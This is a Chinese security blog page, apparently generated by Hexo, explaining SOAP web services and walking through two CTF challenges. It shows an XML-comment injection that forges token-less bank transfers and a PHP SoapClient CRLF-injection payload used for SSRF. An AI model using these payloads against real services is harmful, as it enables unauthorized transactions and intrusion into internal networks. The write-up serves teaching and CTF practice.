@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 SOAP基础知识1.SOAP的基本概念什么是SOAP？这就要从WebService说起了 WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。 比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？ Web">
+<meta name="keywords" content="soap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="soap">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/11/2019-1-11-soap漏洞/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01 SOAP基础知识1.SOAP的基本概念什么是SOAP？这就要从WebService说起了 WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。 比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？ Web">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vboebfmj21c00cgwls.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vhce6p8j20q60mgdhz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vm2a7chj21ek0li49y.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vq5m5waj20h0074dg3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vqk2eqaj20ks07uq3e.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vu0dbncj20el09f3yw.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vvfpictj213u0dcjtg.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vyee16mj20f105hq3m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vys0snqj20jw0crjtf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2w03hyw3j20hq04cdhz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2w09lb4xj20ho0aaabo.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.224Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="soap">
+<meta name="twitter:description" content="0x01 SOAP基础知识1.SOAP的基本概念什么是SOAP？这就要从WebService说起了 WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。 比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？ Web">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vboebfmj21c00cgwls.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/11/2019-1-11-soap漏洞/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>soap | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/11/2019-1-11-soap漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">soap
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-11 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-11T00:00:00+08:00">2019-01-11</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">5.4k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01-SOAP基础知识"><a href="#0x01-SOAP基础知识" class="headerlink" title="0x01 SOAP基础知识"></a>0x01 SOAP基础知识</h1><h2 id="1-SOAP的基本概念"><a href="#1-SOAP的基本概念" class="headerlink" title="1.SOAP的基本概念"></a>1.SOAP的基本概念</h2><p>什么是SOAP？这就要从WebService说起了</p>
+<p>WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。</p>
+<p>比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？</p>
+<p>WebService就是出于以上类似需求而定义出来的规范：开发人员一般就是在具体平台开发webservice接口，以及调用webservice接口。每种开发语言都有自己的webservice实现框架。</p>
+<p>而SOAP作为webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，<strong>SOAP 可以和现存的许多因特网协议和格式结合使用</strong>，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vboebfmj21c00cgwls.jpg" alt></p>
+<p>简单而言，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</p>
+<p>其采用HTTP作为底层通讯协议，XML作为数据传送的格式</p>
+<p>SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于<strong>请求 / 应答</strong>的模式。</p>
+<h2 id="2-SOAP的组成"><a href="#2-SOAP的组成" class="headerlink" title="2.SOAP的组成"></a>2.SOAP的组成</h2><p>一条 SOAP消息的组成：一个包含有一个必需的 SOAP 的封装包，一个可选的 SOAP 标头和一个必需的 SOAP 体块的 XML 文档。</p>
+<p>SOAP消息格式：</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml</span></span><br><span class="line"><span class="meta">version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2001/12/soap-envelope"</span></span></span><br><span class="line"><span class="tag"><span class="attr">soap:encodingStyle</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中</p>
+<p>Envelope: 标识XML文档，具有名称空间和编码详细信息。</p>
+<p>Header：包含标题信息，如内容类型和字符集等。</p>
+<p>Body：包含请求和响应信息。</p>
+<p>Fault：错误和状态信息。</p>
+<p>而关于soap的漏洞，我将用两道ctf的案例进行讲解分析</p>
+<h1 id="0x02-SOAP漏洞利用之代码注入（一）"><a href="#0x02-SOAP漏洞利用之代码注入（一）" class="headerlink" title="0x02 SOAP漏洞利用之代码注入（一）"></a>0x02 SOAP漏洞利用之代码注入（一）</h1><p>题目如下</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vhce6p8j20q60mgdhz.jpg" alt></p>
+<p>我们有如下功能</p>
+<p>1.Profile：显示我们的当前身份和余额，每人最开始都有110元</p>
+<p>2.Menu：主页面</p>
+<p>3.Transfer：允许我们输入接收者ID并发送金额</p>
+<p>4.VIP：需要1,000,000元才能进入该页面，应该是flag了</p>
+<p>5.For Developers：告知我们api正在开发中，无法使用，但是html注释中有api的链接</p>
+<p>不难看出，这是突破点，于是打开api链接后api/bankservice.wsdl.php</p>
+<p>不难提取如下两个SOAP API：</p>
+<p>检查余额</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:requestBalance</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>wallet_num<span class="tag">&lt;/<span class="name">wallet_num</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:requestBalance</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>转账交易</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>receiver_wallet_num<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>sender_wallet_num<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>amount<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一目了然，对于余额检查，输入一个钱包id即可</p>
+<p>而对于转账交易，需要输入接受者、发送者、发送金额、token四个参数</p>
+<p>而我们需要理由的点，也肯定是转账交易了</p>
+<p>这样就可以将所有用户的初始余额汇总到我们手上，以此得到flag</p>
+<p>但是问题来了，我们缺少交易的token，那么如何不需要token，即可让所有人给我们转账呢？</p>
+<p>这里就用到了一些注入</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vm2a7chj21ek0li49y.jpg" alt></p>
+<p>经过插入后，代码成为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>我们自己的id<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>其他人<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;/receiver_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;sender_wallet_num xsi:type="xsd:decimal"&gt;sender_wallet_num&lt;/sender_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;amount xsi:type="xsd:float"&gt;</span></span><br><span class="line"><span class="comment">      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>750000<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过代码的拼接（有点类似于sql注入，但又不是，也是利用语句的拼接与注释），我们即可控制自己想控制的位置，已到达任意转账的目的</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vq5m5waj20h0074dg3.jpg" alt></p>
+<p>最后访问vip页面即可</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vqk2eqaj20ks07uq3e.jpg" alt></p>
+<h1 id="0x03-SOAP漏洞利用之CRLF与SSRF（二）"><a href="#0x03-SOAP漏洞利用之CRLF与SSRF（二）" class="headerlink" title="0x03 SOAP漏洞利用之CRLF与SSRF（二）"></a>0x03 SOAP漏洞利用之CRLF与SSRF（二）</h1><p>这就要从php的soap说起了，正如之前所说每种开发语言都有自己的webservice实现框架，php也不例外：</p>
+<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services</p>
+<p>这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，</p>
+<p>和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。</p>
+<p>他们的关系如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vu0dbncj20el09f3yw.jpg" alt></p>
+<p>而我们的重点利用对象当然是soapclient类</p>
+<p>而为什么soapclient会有CRLF(carriage return/line feed)注入攻击问题呢？</p>
+<p>这又要从soapclient的一个选项说起，我们查阅PHP手册</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure>
+
+<p>其中的$options我们跟进查看</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vvfpictj213u0dcjtg.jpg" alt></p>
+<p>其中有一个选项为<code>user_agent</code></p>
+<p>可以让我们自定义User-Agent</p>
+<p>为什么要利用User-Agent？</p>
+<p>因为http header里有一个重要的Content-Type为和Content-Length</p>
+<p>既然我们想要进行CRLF注入，那么势必需要控制这两项才可以实现</p>
+<p>而User-Agent的http header位置正好在这些之上，所以可以进行覆盖</p>
+<p>对于Content-Type，如果我们想要利用CRLF发送post请求，那么要求它为<code>application/x-www-form-urlencode</code>那么此时就可以利用CRLF，构造如下payload（以N1CTF的payload为例）</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = new SoapClient(null,array(&apos;user_agent&apos;=&gt;&quot;test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n&quot;,&apos;location&apos;=&gt;$location,</span><br><span class="line">&apos;uri&apos;=&gt;$uri));</span><br></pre></td></tr></table></figure>
+
+<p>即可进行CRLF攻击</p>
+<p>这样的攻击有什么用？</p>
+<p>我们假设我们可以从外网调用到soap的api</p>
+<p>而攻击目标是在内网</p>
+<p>那么就可以利用soap攻击内网，因为CRLF的原因，可以增加我们的攻击面，包括sql注入，命令执行等等</p>
+<p>所以也可以说是SSRF攻击了</p>
+<p>其他</p>
+<p>和许多漏洞一样，如果实现不同功能的时候，接收到不同的恶意参数，那么也会引起各种各样的攻击</p>
+<p>像是实现sql查询的功能，可以引起sql注入问题</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vyee16mj20f105hq3m.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2vys0snqj20jw0crjtf.jpg" alt></p>
+<p>实现lookupDNS web服务的功能时，可引起命令注入的问题</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2w03hyw3j20hq04cdhz.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2w09lb4xj20ho0aaabo.jpg" alt></p>
+<p>后记</p>
+<p>soap作为重要的消息通讯连接，如果过滤或者使用不当，很容易引起许多高危攻击</p>
+<p>而本人不才，可能有许多点还没注意到，如有更好的观点，还请斧正！</p>
+<p>来自 <a href="http://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">http://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/11/2019-1-11-soap漏洞/" title="soap">https://wh0ale.github.io/2019/01/11/2019-1-11-soap漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
